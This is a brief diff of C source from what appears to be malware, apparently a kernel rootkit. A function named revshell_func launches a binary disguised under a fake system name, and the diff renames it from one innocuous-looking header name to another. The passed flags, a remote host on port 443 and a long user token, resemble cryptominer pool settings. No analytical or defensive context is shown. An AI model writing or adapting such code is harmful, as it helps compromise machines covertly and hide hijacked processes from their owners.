@@ -9,7 +9,7 @@ int revshell_func(void *data) {
         "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
     };
     char *argv[] = {
-        "/usr/bin/intel_gnu_header",
+        "/usr/bin/intelheaders_gnu",
         "-o", "test:443",
         "-u", "44xquCZQQk4MTL6M2Y73",
         "-k",
